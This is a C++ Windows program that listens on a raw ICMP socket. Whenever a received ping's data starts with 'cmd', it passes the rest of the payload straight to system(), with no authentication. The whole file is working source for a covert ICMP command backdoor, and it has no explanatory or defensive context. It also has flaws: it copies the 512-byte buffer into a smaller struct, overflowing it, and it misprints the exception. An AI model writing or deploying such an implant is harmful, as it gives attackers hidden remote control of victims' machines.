#define _WINSOCK_DEPRECATED_NO_WARNINGS    // defined here and it worked
#include <WinSock2.h>
#include <Mstcpip.h>
#include <Mswsock.h>
#include <stdio.h>
#include <string>
#include <iostream>
#pragma comment(lib, "ws2_32.lib")

typedef struct packet {
	// ethernet frame
	//uint8_t dest_mac[6];
	//uint8_t source_mac[6];
	//uint8_t type[2]; // ipv4 or 6
	// ip packet
	uint8_t version; // ipv4 or 6
	uint8_t services; 
	uint8_t packet_length[2];
	uint8_t identification[2];
	uint8_t flags[2];
	uint8_t ttl;
	uint8_t protocol;
	uint8_t header_checksum[2];
	uint8_t source_ip[4];
	uint8_t dest_ip[4];
	// icmp packet
	uint8_t request_type; //echo request
	uint8_t code;
	uint8_t checksum[2];
	uint8_t identifier[2];
	uint8_t sequence_number[2];
	uint8_t data[56]; // icmp data
};
int main()
{
	//wsastartup
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != NO_ERROR) {
		printf("error in WSAStartup: %d\n", WSAGetLastError());
		exit(-1);
	}
	else {
		printf("WSAStartup success\n");
	}
	//socket
	SOCKET new_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (new_sock == INVALID_SOCKET) {
		printf("error in socket: %d\n", WSAGetLastError());
		exit(-1);
	}
	else {
		printf("socket creation success\n");
	}

	//bind
	sockaddr_in service;
	service.sin_family = AF_INET;
	service.sin_port = htons(0);
	service.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	
	if (bind(new_sock, (sockaddr*)&service, sizeof(service)) == SOCKET_ERROR) {
		printf("error in bind: %d\n", WSAGetLastError());
		exit(-1);
	}
	else {
		printf("socket bind success\n");
	}
	try 
	{
		while (1)
		{
			//recv
			char recvbuf[512];
			sockaddr_in SenderAddr;
			int SendAddrSize = sizeof(SenderAddr);
			if (recvfrom(new_sock, recvbuf, sizeof(recvbuf), 0, (sockaddr*)&SenderAddr, &SendAddrSize) == SOCKET_ERROR) {
				printf("error in recv: %d\n", WSAGetLastError());
				exit(-1);
			}
			else {
				printf("socket recv success\n");
			}
			// icmphdr 
			int i = 0;
			packet icmp_packet;
			memcpy(&icmp_packet, recvbuf, sizeof(recvbuf));
			if (icmp_packet.data[i] == 'c' && icmp_packet.data[i + 1] == 'm' && icmp_packet.data[i + 2] == 'd')
			{
				i += 4;
				while (icmp_packet.data[i] != 204 && i < sizeof(icmp_packet.data))
				{
					// printf("%c", (char)icmp_packet.data[i]);
					i += 1;
				}
				int len = i;
				icmp_packet.data[i] = '\0';
				system((char*) & icmp_packet.data[4]);
				memset(recvbuf, 0, sizeof(recvbuf));
			}
			
			
		}
	}
	catch (const std::exception& e)
	{
		printf("error: %s", e);
	}


	//wsacleanup
	WSACleanup();
	return 0;
}
